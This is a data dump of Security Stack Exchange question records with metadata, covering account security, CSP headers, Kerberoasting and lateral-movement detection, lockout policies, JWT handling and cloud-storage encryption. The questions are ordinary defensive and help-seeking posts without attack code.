"153874","1","153905","","2017-03-14 22:39:42","","0","265","<p>I am referring to <a href=""https://community.rsa.com/docs/DOC-54594"" rel=""nofollow noreferrer"">https://community.rsa.com/docs/DOC-54594</a> to work to detect Windows Lateral Movement Detection. There is a rule regarding Correlation Rule: Windows Automated Explicit Logon. It states the threshold count should be greater than 9. Is it compulsory? Doesn't even one automated logon entry raise a concern?</p>
","133655","","","","","2017-03-15 07:30:47","Windows Automated Explicit Logon Rule to detect Lateral movement","<windows><account-security>","1","0","","","","CC BY-SA 3.0"
"153968","1","","","2017-03-15 17:04:11","","1","204","<p>I have just taken control of a small corporate network with aprox 50 users. They have no firewall, no internet monitoring, thankfully they do have AD set up.... Anyway its just the way its grown up over the last 5 or so years with little-to-no proper IT intervention. it sort of works, but its time to sort it out.</p>

<p>So it has become clear that people are sharing user accounts, using other peoples' accounts, and certainly one team even has a list of their passwords on the desk, as they never change and sometimes need to ""nip on"" to someone else's account...</p>

<p>My recent background is in slightly bigger networks, say 500-1000 users, where strict IT policies are enforced, passwords are changed by force monthly, and everyone has their own account, passwords are NOT shared.</p>

<p>This needs to change - but i will likely get resistance from the management and teams. <strong>So, What reasons can i give to the management to justify the ""crackdown"" and enforcement of a stricter IT policy?</strong></p>
","142032","","","","","2017-03-15 17:27:54","What are the problems with users sharing network passwords?","<passwords><account-security>","1","1","","","","CC BY-SA 3.0"
"154056","1","","","2017-03-16 12:08:43","","1","81","<p>My email client allows for separate keys for signing and encryption, so my signature key pair can be generated and signed by a third party and my encryption keys can be generated by me personally without 3rd party involvement, or so I thought.</p>

<p>So why does my public encryption key need to be signed? I just use it for encryption, not identification.</p>
","25934","","","","","2017-03-16 12:08:43","Why does my email encryption certificate need to be signed?","<cryptography><email><account-security>","0","3","","","","CC BY-SA 3.0"
"14823","1","","","2012-05-10 00:06:42","","1","1881","<p>I am running a Debian Squeeze VPS and need a good IDS. I have used snort before and it was quite good but i am wandering if there are any other good ones out there.</p>

<p>Preferably compatible with modsecurity.</p>
","8571","","","","","2012-05-10 08:23:20","What IDS Do you recommend?","<ids><mod-security><snort>","2","1","","2012-05-10 09:14:04","","CC BY-SA 3.0"
"154094","1","","","2017-03-16 18:07:18","","1","200","<p>I am building a static website with an Instagram feed and I came across a solution that utilizes Javascript to access API data for a single user. The method many are using is outlined in this blog post: <a href=""http://matthewelsom.com/blog/display-instagram-photos-on-webpage-with-instafeed.html"" rel=""nofollow noreferrer"">Display Instagram Posts on a Webpage with Instafeed.js</a></p>

<p>My concern is that it exposes the access_token in the webpage source. I believe this would mean that anyone with this information could ""impersonate"" the Instagram user and have the same feed elsewhere without their knowledge. What methods are there to obfuscate sensitive information in the page source? Is SSL required as well?</p>
","56238","","","","","2017-03-16 18:07:18","Obfuscate exposed access_token in Javascript","<javascript><account-security>","0","1","","","","CC BY-SA 3.0"
"223615","1","223617","","2020-01-03 07:07:27","","1","96","<p>I’m willing to create a system of transferable documents (identified by it’s ID) whose author can transfer his ownership of that document to another person (identified by his/her ID).</p>

<p>For example:</p>

<ol>
<li>Alice; owner of document 1.</li>
<li>Alice transfers his ownership of that document to Bob.</li>
<li>Now: Bob is owner of document 1.</li>
<li><strong>Alice says she is the owner of document 1, but she fails.</strong></li>
</ol>

<p>(Item 4 is very important)</p>

<p>We can make sure that the system with it’s author remains untouched by using <em>digital signature</em>. But if Alice made a copy of that document signed when she was the owner, there would be no way to prevent her from saying she is not the owner of the document.</p>

<p>So we would need something to make a signature to expire whenever it is transferred.</p>

<p>IF I HAD A DATABASE: I would simply add that signature to a ban list.</p>

<p>Are there any solutions to preserve the uniqueness of this document?</p>
","223270","","10863","","2020-01-03 08:23:56","2020-01-03 08:23:56","How can I preserve the uniqueness of a document without a database?","<digital-signature><design-flaw><security-by-design>","1","0","","","","CC BY-SA 4.0"
"223645","1","223719","","2020-01-03 19:24:47","","3","768","<p>The <a href=""https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/require-sri-for"" rel=""nofollow noreferrer"">description</a> from Mozilla warns that <code>require-sri-for</code> is obsolete and may be removed at any time.</p>

<p>The feature seems useful, especially for large websites where it's likely that a developer may forget to include an integrity attribute.</p>

<p>Is there a specific reason this has been deprecated? Is there an alternative feature to use instead?</p>
","31625","","","","","2020-01-05 14:30:07","Why is CSP require-sri-for marked as obsolete?","<content-security-policy>","1","2","","","","CC BY-SA 4.0"
"88610","1","170504","","2015-05-06 07:23:13","","9","3280","<p>In underscore.js, template rendering causes violation of the 'unsafe-eval' property, with CSP error at following line:</p>

<pre><code>render = new Function(settings.variable || 'obj', '_', source);
</code></pre>

<p>The solution to this on some forums have been to Sandbox the underscore according to the <a href=""https://developer.chrome.com/extensions/sandboxingEval"" rel=""noreferrer"">Chrome documentation</a>.</p>

<p>But how will this solution work for a web based application where there are number of users with different browsers? Are there any alternate solutions to this problem? Please note that the application I am working on is large and heavy, so code changing will take a lot of time.</p>
","72008","","98538","","2016-06-14 14:56:13","2018-06-20 11:43:49","Problem in underscore.js with ""new Function()"" when CSP header is set","<xss><javascript><chrome><content-security-policy>","2","1","","","","CC BY-SA 3.0"
"223801","1","","","2020-01-07 09:22:01","","5","1370","<p>Proprietary software developed by a (smallish) company is stored in the company's GitHub private repository. For work, software engineers are requested to create company-specific GitHub account bound to their work email address.</p>

<p>But access to the private repository can be granted or revoked independently from the ""account origin"". What can be the risks of using personal (i.e. associated with an email which is not related to the company) GitHub account by developers?</p>

<p><em>Edit:</em> I see one potential risk: if the account is used also for other things than work, its SSH key is likely to be saved also in places where these ""other things"" are done. This is a potential threat to work repositories; with a dedicated account, it's easier for the developer to keep the key(s) only in work-related (maybe controlled) environments.</p>

<p>Are there any other specific risks?</p>
","50647","","50647","","2020-01-07 10:26:35","2020-01-07 10:26:35","Risks of allowing employees using personal GitHub accounts for work","<account-security><github>","1","1","","","","CC BY-SA 4.0"
"223825","1","223835","","2020-01-07 17:50:09","","1","197","<p>I am a junior web developer. All I know is mostly about web development. I have no skills and knowledge about system security and know little about Linux.</p>

<p>I work in a company which is developing some embedded product. In the R&amp;D department, some developers built a build-server for development. They make our own Docker image and run Docker, including CI/CD and Gitlab service, in this server.  </p>

<p>This build-server connects with our AD server. Our developer could add his own public Key to this server and then remotely log in to this server with SSH and doing development in this server. We call it DevOps.</p>

<p>This server only works in our company's intranet or VPN, not open for public Internet.</p>

<p>The above is all background information.</p>

<hr>

<p>A few months ago I read some IT security blogs about Docker security issues. It says that because the architecture of Docker is different from traditional VM, if the Docker image is backdoored, then the whole system will be easily hacked.</p>

<p>If I suppose that the person who built this build-server is not a good guy, and he backdoored the Docker images, is it possible that my account in this build-server could be hacked or usurped?</p>

<p>I mean even I use the public key and SSH login, without typing the password manually. Does this risk still exist?</p>

<p>Second question: if the first question above is TRUE, what could I do to protect my self?</p>

<p>I mean, if the bad guy usurped my account and did something bad thing (for example, leaking development codebase of company using my account or doing other attacks using my account), how could I prove I am innocent?</p>

<p>I can not discuss these suspicions thinking with my colleague because I have no evidence about those things. I just worry about these becoming true, so I want to do something to prevent, just in case. I also have no authorization to check or validate the server.</p>

<p>What could I do? Backup my login logs of my laptop periodically? (But it seems irrelevant to the build-server.)</p>
","224599","","129883","","2020-01-07 19:53:43","2020-01-07 21:39:58","Risk of Docker backdoor allowing impersonation","<linux><account-security><forensics><docker><privileged-account>","1","1","","","","CC BY-SA 4.0"
"154496","1","","","2017-03-21 14:38:05","","2","133","<p>Consider the following authentication flow.</p>

<ul>
<li>User sends in their username and an RSA encrypted password</li>
<li>The password is decrypted and hashed with a salt (and possibly a pepper) and verified </li>
<li>If the hash matches a GUID is generated as a token and the token is given a TTL and expiration date and returned to the user. In addition the IP address of the caller is saved</li>
<li>That username with the token is then used for any future interaction with the DB (Any time the token is used its expiration date is extended). Only the IP which created the token can use the token.</li>
<li>Logging in from a new IP must first be verified using a second form of authentication (ex. a code sent to the users email)</li>
</ul>

<p>What are the security concerns of such an authentication system?</p>

<p>I feel like such a system would be using tokens incorrectly as from what I've read it seems that the purpose of tokens are meant to be for authorization and not authentication. I feel as though the only benefit of using the token is that a password can be used to log in anytime and the token eventually expires so if it becomes expired it will eventually become useless.</p>

<p>One of my concerns would be if someone is constantly listening in and intercepting the token that would essentially mean they could use it to access the database whenever there is an active token (and can indefinitely refresh a token to keep it active). This is why the IP address would be stored and access would only be given to that IP address. Would this minimize the risk of the token being misused. </p>

<p>In general a token can't be passed back encrypted, how can anyone prevent a token from being intercepted and misused?</p>
","141587","","","","","2017-03-21 15:04:26","Would this be a secure Authentication flow?","<authentication><account-security>","1","0","","","","CC BY-SA 3.0"
"154516","1","","","2017-03-21 18:30:39","","3","261","<p>I am working to detect kerberoasting activity and I am referring this <a href=""https://adsecurity.org/?p=3458"" rel=""nofollow noreferrer"">link</a>.
It states that an account cannot be requesting several different service names within a second or two of each other. What is the threshold for this? I do see some account accessing 3 SPNs in 1 second.</p>
","133655","","","","","2017-03-21 18:54:02","Detect Kerberoasting activity","<account-security><kerberos>","0","0","","","","CC BY-SA 3.0"
"88787","1","88789","","2015-05-08 09:56:58","","2","3550","<p>Is it possible to specify source list values based on the script src. The <a href=""http://www.w3.org/TR/CSP/#enforcing-multiple-policies"" rel=""nofollow"">RFC mentions</a> it, but I'm not sure about its usage.</p>

<p>For example:</p>

<pre><code>Content-Security-Policy:default-src *; script-src 'unsafe-inline' 'self';
Content-Security-Policy:script-src 'unsafe-inline' 'unsafe-eval' https://maps.googleapis.com/*';
</code></pre>

<p>This combination means to disallow <code>unsafe-eval</code> everywhere except the Google Map APIs (which needs that).</p>

<p>If not then, it really means that apps have to remove <code>unsafe-eval</code> for everything just because a service like Google Maps needs it. I'm not sure if nonces can be used for this type of situations.</p>
","11012","","11012","","2015-05-08 10:20:11","2019-01-21 12:31:51","How to specifically whitelist JS libraries which need unsafe-eval","<google><content-security-policy>","1","0","","","","CC BY-SA 3.0"
"154645","1","154647","","2017-03-23 00:38:28","","1","163","<p>Everywhere i have looked at login's and how to deal with them, or tutorials is just showing me compare to plain text.<br></p>

<p>I know never to store a plain text password in the database.<br>
I am just asking if there is any material i can read or look at that has a general standardized way of storing password at a semi-commercial level. 
<br>
<br>
I'm asking due to creating a application myself, and wish to have good security practices from the start, so as to improve on them further in my IT life.
<br>
Things i am assuming</p>

<ol>
<li>Encrypt the password and store it</li>
<li>Upon logging in Encypt the password and compare the two.
<br></li>
</ol>

<p>I just want to further my knowledge for a more commercial level login system, instead of learning about plain text logins.. Any sources would be much appreciated.</p>
","98848","","","","","2017-03-23 00:51:56","Security on Login whats the best practices","<encryption><authentication><account-security>","1","1","","2017-03-23 07:20:01","","CC BY-SA 3.0"
"224090","1","","","2020-01-12 22:32:12","","1","616","<p>Do E-Mail proxy services exists to improve privacy and security?</p>

<p>Privacy in the sense that one wouldn't need to give a website his/her username (possibly even in the firstname.lastname@domain.tld form) and in a security sense that the used e-mail couldn't be used to log into the e-mail service (thereby making it useless for a leaked password, because the e-mail address couldn't be used to login).</p>

<p>Example:</p>

<p>john.doe@gmail.com could be someone's e-mail. If there were a Google Privacy/Proxy service then one could generate as many random e-mails as possible and if one would be sent spam to, or leaked, it could be disabled:</p>

<ul>
<li>abcdef@gmail.proxy</li>
<li>290dcef@gmail.proxy</li>
</ul>

<p>could both redirect mail to john.doe@gmail.com.</p>

<p>One could be blocked/disabled/removed if wanted without abandoning the real account (e.g. because <code>290dcef@gmail.proxy</code> has been compromised or spam is being sent to it).</p>

<p>Would it really improve security and privacy? Or am I missing something?</p>

<p>And does such a service exist? (as a bonus, replying from such proxy e-mails would be even better, converting the real account <code>from</code> field to the proxy mail address)</p>
","65956","","65956","","2020-01-12 22:38:00","2023-07-28 18:01:55","E-Mail privacy proxy for hiding real e-mail?","<privacy><email><account-security>","4","2","","","","CC BY-SA 4.0"
"224115","1","","","2020-01-13 12:47:56","","0","166","<p><a href=""https://i.stack.imgur.com/8GmSI.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/8GmSI.png"" alt=""Request log example 1""></a></p>

<p><a href=""https://i.stack.imgur.com/uFZcE.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/uFZcE.png"" alt=""Request log example ""></a></p>

<p>I was doing my plesk hosting logs checking for web and database development. Somehow, I had seen some weird ip trying to communicate to hosting. Wonder what is the purpose of these anonymous requests. Should I just ignore them as they are common issue happening around?</p>

<p>Thanks in advance. P/S: This website still in development stage, should be no one knowing this website address.</p>
","224946","","","","","2020-01-13 13:01:52","Why there are some weird requests to my web hosting","<tls><http><account-security>","1","3","","2020-01-13 14:47:39","","CC BY-SA 4.0"
"154800","1","","","2017-03-24 13:10:17","","18","15139","<p>Imagine I wish to upload my sensitive personal information (photos, document scans, list of passwords, email backups, credit card information, etc.) on Google Drive (or any other cloud service).</p>

<p>I want to make sure this entire bunch of data is as safe as possible (against hackers that would in some way get their hands on this data, and against Google and its employees, and also in the future, i.e. if I delete this data from Google I want to be sure they won't be able to 'open' it even if they keep its backup forever).</p>

<p>So in this case instead of uploading all this data right away to the cloud, I will instead make one folder containing all the data I want to upload, and then I will compress this entire folder using 7-Zip and of course password-protect it using 7-Zip.</p>

<p>I will do this not once, but a few times, i.e. once I have the 7-Zip password-protected archive ready, I will compress it once again using 7-Zip and use a completely different password. I will do this five times. So in the end my data is compressed five times and it has been password-protected using 7-Zip by five completely different unrelated passwords. So in order to get to my data I have to extract it five times and provide five different passwords.</p>

<p>What I will then do is that, I will take this five-times-password-protected archive, and I will compress it once again using 7-Zip and yet a different sixth password, but in addition to that this time I will also choose to split the archive into smaller chunks.</p>

<p>Let's say in the end I end up with 10 split archives, where each of them is a 200&nbsp;MB archive except the 10th one being only a 5&nbsp;MB archive.</p>

<p>The assumption is, all those six passwords are at least 32-character passwords and they are completely unrelated and they all contain lower/upper case, numbers, and symbols.</p>

<p>Now I take those nine 200&nbsp;MB archives and put them in one container and encrypt the container using <a href=""https://en.wikipedia.org/wiki/VeraCrypt"" rel=""noreferrer"">VeraCrypt</a> (assuming the three level cascade encryption) and then upload this container to my Google Drive.</p>

<p>I keep the 10th archive (the 5&nbsp;MB one) on a completely different service (say on Dropbox -- and that Dropbox account is in no way connected/linked to my Google account at all) (also encrypted by VeraCrypt).</p>

<p><strong>- Have I created a <a href=""https://en.wikipedia.org/wiki/Security_theater"" rel=""noreferrer"">security theater</a>? Or have I really made it impossible for anyone to access and extract my data? After all they have to pass one level of encryption by VeraCrypt and even after that the archives are six times password protected and one of the archives (the tenth one) is stored somewhere else!</strong></p>

<p><strong>- If someone gets access to my Google Drive and downloads all those nine archives, is there any way for them to extract the archive without having the last (the tenth) 5&nbsp;MB archive? Can the data in any way be accessed with one of the split-archives missing?</strong></p>

<p><strong>- Even if someone gets their hand on all those 10 archives together and manages to bypass the VeraCrypt encryption in any way, will it be still feasible to break the six remaining passwords?</strong></p>
","142930","","1271","","2017-03-25 07:33:37","2017-03-27 09:13:24","Are 7-Zip password-protected split archives safe against hackers when they are password-protected a couple of times?","<encryption><privacy><security-theater><compression><cloud-storage>","8","12","","","","CC BY-SA 3.0"
"154843","1","154856","","2017-03-24 20:04:30","","4","427","<p>In Windows 10, there is the Administrator account that is disabled by default. What should I do with it, with regards to hardening Windows?</p>

<p>I have heard of adding a password to it, but is that necessary if it is set to Disabled?</p>

<p>Thank you.</p>
","90904","","","","","2017-03-24 23:28:33","What should I do with the hidden/disabled Administrator account?","<windows><hardening><account-security>","2","0","","","","CC BY-SA 3.0"
"224176","1","224185","","2020-01-14 10:48:26","","0","1955","<p>I want to be active on Twitter against our oppressive government. Can my government trace and detect me? </p>

<p>Twitter is banned here and we must use VPNs. I use Outline (Shadowsocks) mostly. Is there any way to trace users via information from the ISPs or something? If using Outline is not a good option, is using TOR a good solution?</p>

<p>The importance of this question is that I can be sentenced to death for just a Twitter post! I don't want to be traced. I remove metadata of Images I post and do some basic methods but I want to be sure there is not any problem with my activity on Twitter. What I have to do?</p>
","225018","","225018","","2020-01-15 14:56:01","2020-01-15 15:13:57","Can my oppressive government trace my Twitter activity and detect me?","<privacy><account-security><web><twitter>","2","4","","","","CC BY-SA 4.0"
"224199","1","","","2020-01-14 19:37:21","","3","2271","<p>OWASP recommends setting session timeouts to minimal value possible, to minimize the time an attacker has to hijack the session:</p>
<blockquote>
<p>Session timeout define action window time for a user thus this window represents, in the same time, the delay in which an attacker can try to steal and use a existing user session...</p>
<p>For this, it's best practices to :</p>
<ul>
<li>Set session timeout to the minimal value possible depending on the context of the application.</li>
<li>Avoid &quot;infinite&quot; session timeout.</li>
<li>Prefer declarative definition of the session timeout in order to apply global timeout for all application sessions.</li>
<li>Trace session creation/destroy in order to analyse creation trend and try to detect anormal session number creation (application profiling phase in a attack).</li>
</ul>
<p><em><a href=""https://www.owasp.org/index.php/Session_Timeout#Impact_of_the_session_timeout_on_security_and_best_practices"" rel=""nofollow noreferrer"">(Source)</a></em></p>
</blockquote>
<p>The most popular methods of session hijacking attacks are <a href=""/questions/tagged/session-fixation"" class=""post-tag"" title=""show questions tagged &#39;session-fixation&#39;"" rel=""tag"">session-fixation</a>, packet <a href=""/questions/tagged/sniffing"" class=""post-tag"" title=""show questions tagged &#39;sniffing&#39;"" rel=""tag"">sniffing</a>, <a href=""/questions/tagged/xss"" class=""post-tag"" title=""show questions tagged &#39;xss&#39;"" rel=""tag"">xss</a> and compromise via <a href=""/questions/tagged/malware"" class=""post-tag"" title=""show questions tagged &#39;malware&#39;"" rel=""tag"">malware</a>, but these are all real-time attacks on the current session.</p>
<p>Once hijacked, the attacker will be able to prevent an idle timeout (via activity), and I would consider <em>any</em> successful session hijack a security breach anyway (unless you want to argue how much larger than zero seconds of access an attacker can have before it actually counts as an <em>actual</em> breach).</p>
<p>If the original method of getting the session token can be repeated, this seems to further limit the usefulness of a timeout -- a 5-minute window that can be repeated indefinitely is effectively not limited.</p>
<p><strong>What real-world attack exists (even theoretically) where a session timeout would be an <em>effective</em> mitigation?</strong> Is session expiry really just a form of <a href=""/questions/tagged/security-theater"" class=""post-tag"" title=""show questions tagged &#39;security-theater&#39;"" rel=""tag"">security-theater</a>?</p>
","27894","","-1","","2020-06-16 09:49:05","2020-01-14 22:24:04","What attacks are prevented using Session Timeout or Expiry?","<session-management><security-theater><session-fixation>","1","12","","","","CC BY-SA 4.0"
"224279","1","","","2020-01-16 01:42:27","","-2","124","<p>So, I have Google alerts set for a few words, and one of these alerts had a link to the site ""chatsosedi.ru"" which I opened. I found  out the site isn't https. I clicked on it before realizing. Is it  safe, &amp; what can I do to secure my email and phone now? Thanks </p>
","224090","","","","","2020-01-16 02:12:33","I opened an http website from my email, how can I know if it's safe?","<account-security><security-by-design>","1","2","","","","CC BY-SA 4.0"
"224330","1","","","2020-01-16 20:07:38","","0","208","<p>I currently use mod_security in combination with maldec and block almost all attempts to upload shells, leading them to error 406. However, I found one ""problem"" if I upload Shell through an ftp client then I can use shell in hosting.  my question is how to block the opening of the shell even if uploaded via ftp?  any mod_security rule to use and if so what?  I also use cPanel</p>
","225192","","6253","","2020-01-16 20:49:10","2020-01-16 20:49:10","How to block for open Web Shell in my CentOS 6","<linux><shellcode><mod-security>","1","2","","","","CC BY-SA 4.0"
"224391","1","","","2020-01-17 18:37:11","","0","271","<p>It appears to me that apps like Whoscall and CallApp might access your photos and such. In case of a potential data breach/hacking in one of these apps - how can I delete my info from their servers?</p>
","193297","","6253","","2020-01-18 09:43:41","2020-01-18 09:43:41","How do I protect my info from apps like CallApp?","<account-security>","1","2","","","","CC BY-SA 4.0"
"155378","1","","","2017-03-31 09:02:45","","3","502","<p>My Yahoo account shows no suspicious activity, only log-ins from my desktop and 2 of my devices. But a friend was spammed twice within a short time today from my email address. I use Yahoo's Account Key system, so there is no password to change. Should I be concerned about this? And what likely happened? Nobody else has reported getting spammed by me, so far at least. Thanks!</p>
","143560","","","","","2018-02-27 00:53:04","Yahoo account ""secure"" but spam sent from my address","<passwords><email><spam><account-security><yahoo>","1","1","","","","CC BY-SA 3.0"
"16036","1","17240","","2012-06-14 07:42:13","","0","2661","<p>Is there any good open source software for Security Risk Analysis? </p>

<p>for example something like one explained on : <a href=""http://www.security-risk-analysis.com/introduction.htm"" rel=""nofollow"">http://www.security-risk-analysis.com/introduction.htm</a></p>
","7224","","7224","","2012-06-14 12:56:47","2012-07-15 23:09:35","Is there any good open source software for Security Risk Analysis? ","<security-theater>","2","3","","","","CC BY-SA 3.0"
"16068","1","","","2012-06-15 05:52:47","","3","140","<p>I have Ubuntu server 12.04 on VDS and I allow users to run their own Rails applications on behalf their own accounts. That means:</p>

<ol>
<li>They can use any shell they want</li>
<li>They can upload what they want, e.g. .so libs</li>
<li>They can call any function from any .so lib they uploaded</li>
</ol>

<p>What can I do to separate them as much as possible and to save my server from being taken under control in such circumstances?</p>
","10646","","414","","2016-04-05 11:12:00","2016-04-05 11:12:00","What can I do to separate users best way if they are allowed to run their ruby (python) code","<linux><access-control><account-security>","1","0","","","","CC BY-SA 3.0"
"224720","1","244943","","2020-01-23 14:21:10","","0","250","<p>I am currently implementing an iOS app, which integrates with a cloud hosted .net backend system in azure, which.</p>

<p>The api login endpoint takes user/pass -> replies with an signed only HS256 jwt token. All further calls to the endpoint require an Authorization header of type bearer, and the endpoint supports renewal of this token, as long the token is not expired, for what it seems to be an infinite amount of time.
(which in itself isn't great). The server-side seems to validate the signature of this token in every request.</p>

<p>In the past having used only RSA tokens, we always shared with clients the public key so they could verify the signature of the token. However since this api only supports HS256, this is not possible.</p>

<p>What security risks would a client not verifying the signature incur for the client side?
An obvious one is accessing cached data within the screens. But would there be more serious ones?
Thanks in advance.</p>
","204628","","","","","2021-02-27 22:38:31","jwt symmetric signature security risks (from client side)","<account-security><jwt><client-side>","2","7","","","","CC BY-SA 4.0"
"155486","1","155498","","2017-04-02 01:21:47","","4","5309","<p>I want to implement something similar to gmail where signing in from a new device will make the user confirm that it is them through some form of MFA. However, I am unsure what to use to determine that a new device has been used across different systems and devices (ie. desktops, tablets, etc.)</p>

<p>My first thought was to use the public IP address, but this can change very frequently so it isn't very useful.</p>

<p>My second thought is to use the private IP. Is storing users private IPs a bad idea?</p>

<p>Is there a better third option?</p>

<p>Edit: To clarify, I want to know what data to use to determine whether or not a new device is being used (not how to authenticate the user once I determine that a new device is being used).</p>
","141587","","141587","","2017-04-02 02:41:28","2017-04-04 11:38:29","How to identify a users device","<authentication><ip><account-security>","3","1","","","","CC BY-SA 3.0"
"224865","1","","","2020-01-26 07:12:12","","0","258","<p>I've used Dashline (password manager) with random generated passwords, but I forgot the master password and there is no way to get it back. I read that password managers and random generated passwords aren't that safe as I thought they are. So what type of a password should I have that is the safest?</p>
","225783","","","","","2020-01-26 13:38:17","What's the safest password type?","<passwords><account-security>","2","3","","2020-01-26 14:52:25","","CC BY-SA 4.0"
"224965","1","224976","","2020-01-28 17:57:08","","5","5974","<p>I just installed the <code>Global Protect VPN</code> from my company on my local machine so I can access our servers remotely.  I just ""agreed"" to the following statement: </p>

<blockquote>
  <p>VPN Connected</p>
  
  <p>This system is for the use of authorized users only. Individuals using
  this computer system without authority, or in excess of their
  authority, are subject to having all of their activities on this
  system monitored and recorded by system personnel. In the course of
  monitoring individuals improperly using this system, or in the course
  of system maintenance, the activities of authorized users may also be
  monitored. Anyone using this system expressly consents to such
  monitoring and is advised that if such monitoring reveals possible
  evidence of criminal activity, system personnel may provide the
  evidence of such monitoring to law enforcement officials.</p>
</blockquote>

<p>I understand that they can (and should?) monitor all of my traffic while the VPN is enabled.  </p>

<p><strong>My question is if they can monitor all of my web traffic when the VPN is Disabled?</strong> </p>

<p>The above statement doesn't seem like it limits the monitoring to just when the VPN is Enabled. </p>
","225945","","","","","2021-08-27 07:08:19","Can the GlobalProtect VPN of my company track websites when Disabled?","<privacy><vpn><account-security><monitoring><surveillance>","1","0","0","","","CC BY-SA 4.0"
"155754","1","155766","","2017-04-05 15:35:44","","71","14490","<p>Some websites lock out a user after a series of incorrect password attempts for example for 15 minutes. If a malicious actor knows this, can they deliberately try logging in with incorrect passwords every 15 minutes to prevent the real person from logging in? Is this a real threat and if so how can websites protect against it?</p>
","142970","","","","","2017-04-11 04:29:42","Can a malicious actor lock the real user out by deliberately trying incorrect passwords every X minutes?","<account-security><account-lockout>","6","14","","","","CC BY-SA 3.0"
"155785","1","","","2017-04-05 22:29:04","","2","108","<p>I've been tasked to work on a password reset tool for my company website. This tool is for a support person to provide a new reset password over the phone in case the customer does not receive the email or is locked out of their email account.</p>

<p>Now firstly I would personally say this isn't ideal as I believe there are other methods such as receiving a reset code via phone - however as that's apparently not an option I was left with the task.</p>

<p>So I was tasked to add 2 security questions to the users' accounts, where the questions are pre-selected (by the user) out of about 14 questions. The idea being that a user will call and be asked the questions and if both answers were correct then the password would be reset and given to the end user.</p>

<p>While building the reset form I went ahead and decided for extra security to add a post code (UK company and customers) and their primary contact number - both which are required on sign up. The process then being: take users email, confirm post code and primary phone number, ask for security question answers - if all ok then give new password.</p>

<p>The disagreement I had was with the other members of my team who thought this amendment was completely unnecessary.  Personally I thought this would be an additional step from a data protection point of view and an added level of security.</p>

<p>My question is who is right?  Am I being too protective or are the other members of the team being too hasty?</p>
","144034","","45733","","2017-04-05 22:58:39","2017-04-06 06:17:58","Should we confirm other personal details before security questions during password resets?","<account-security><password-reset><eu-data-protection>","1","1","","","","CC BY-SA 3.0"
"225111","1","","","2020-01-31 03:31:16","","9","694","<p>I have a domain email address which in addition to being able to create multiple mail accounts allows the creation of aliases for each inbox. </p>

<p>Is there any benefit to security in using a different email alias for every website/service I have an account/will make an account for in the future? Specifically from the angle of data breaches? </p>

<p>My thought is that if a breach happens and accounts are compromised, in addition to changing the password I can simply nuke the alias and create a new one and switch the account email to that.</p>
","226103","","","","","2020-01-31 18:16:49","Is there a benefit to using a different email for every online account?","<email><account-security><breach>","3","0","","","","CC BY-SA 4.0"
"225268","1","","","2020-02-03 11:30:50","","1","212","<p>Windows 10 Home's default account lock system for the admin account is not completely secure because there are multiple free password recovery tools &amp; ways available that can be used by a non-admin to reset/bypass the admin password.</p>

<p>How to secure Windows 10 Home admin's data &amp; installed programs behind a password, even when programs like Office, Chrome, etc. are opened and running in the background with some documents/pages opened in it?</p>

<p>Securing data with multiple solution/software is acceptable<br/>
&amp; if all the non-windows hard drive partitions can't be secured, it's also acceptable.</p>

<p>Edit: Securing data when anyone can have physical access to the locked device(running but password protected).<br/>
Edit 2: &amp; when the system is used by only one user, through the admin account.</p>
","111845","","111845","","2020-04-18 09:13:35","2020-04-18 09:13:35","Secure Windows 10 Home admin's data behind a password, even when user apps are running","<encryption><passwords><windows><account-security><windows-10>","1","4","","","","CC BY-SA 4.0"
"225281","1","225283","","2020-02-03 15:24:32","","0","261","<p>I am starting to implement an exponential backoff system to lockout accounts after a certain amount of failed attempts (1min after 5 fails, 2min after 10 fails, etc.). However, as <a href=""https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks"" rel=""nofollow noreferrer"">this source</a> suggests, attackers can detect account existence, using the fact that only legitimate accounts are locked after too many failed attempts.</p>

<p>My fix would be to also lockout non-existent accounts, by keeping a list of accounts name with number of failed attempts, reset regularly. This way the system will not reveal any information about accounts existence. Does this seems like a good solution?</p>

<p>If not, what would you suggest?</p>
","226294","","226294","","2020-02-03 15:35:39","2020-02-03 16:01:15","Account lockout for inexistant accounts","<authentication><brute-force><account-security>","1","3","","","","CC BY-SA 4.0"
"225426","1","","","2020-02-05 23:01:11","","1","103","<p>Which information is utilized in the account recovery process, after an account hack, if all personal information used to create the account was made-up (such as a nickname) and it's impossible to assign the information to a physical person? </p>

<p>Specifically for a YouTube channel. </p>

<p>If both Gmail and Google accounts, which are needed to create the YouTube Channel, are created in a manner where all information submitted is made up and impossible to prove the ownership of,  by what does YouTube / Google identify me as the rightful owner of the channel?</p>
","226509","","","","","2020-02-05 23:01:11","How is the ownership of a hacked account assigned back to the rightful owner, if the owner used made-up info to create the account?","<account-security>","0","2","","","","CC BY-SA 4.0"
"225520","1","","","2020-02-07 17:23:44","","3","2990","<p>Is NONCE supported in Asp.Net when implementing the Content-Security-Policy header to protect from XSS ??</p>
<p>I read that NONCE was not supported in Asp.Net, however, I read another simple article, that shows how it is done? Does anyone use nonce for CSP headers, I was able to make my implementation work without it by using unsafe-inline tags for the inline java-script that is in my enterprise web app, it is not feasible to move the inline JS to external files, so the unsafe-inline src was rec. by the client.</p>
<p>I am wondering how many people actually use nonce, or hash when implementing CSP. Also, any general best practices on CSP would be appreciated.</p>
","190117","","221316","","2022-10-22 11:09:23","2022-10-22 11:09:23","NONCE not supported in Asp.Net for CSP implementation","<xss><http><asp.net><content-security-policy><nonce>","2","3","","","","CC BY-SA 4.0"
"225526","1","","","2020-02-07 20:37:51","","2","292","<p><strong>Are injection vulnerabilities mainly a design or an implementation problem?</strong> I'm using SQL injection as an example; I'm interested in other injection vulnerabilities as well.</p>

<p>I believe that it is the direct consequence of lazy programming, i.e.</p>

<ul>
<li>lack of input sanitization </li>
<li>lack of parameterization (not using APIs and instead building SQL commands directly in code using strings)</li>
</ul>

<p><strong>Some people say it is mainly a design flaw but I cannot figure out why.</strong></p>
","126886","","129883","","2020-02-13 03:30:15","2020-02-13 03:30:15","Are injection vulnerabilities a design or an implementation flaw?","<sql-injection><injection><design-flaw><security-by-design>","3","3","","","","CC BY-SA 4.0"
"225569","1","","","2020-02-09 05:48:28","","27","16908","<p>Online joint accounts that are similar to bank accounts that are joint accounts?</p>

<p>Say you want to have two partners for a certain account, let's say a PayPal account, and you want to make it so that if one partner wants to change a password he must get confirmation from the second person. </p>

<p>Are there currently any online accounts that have a such a feature?</p>
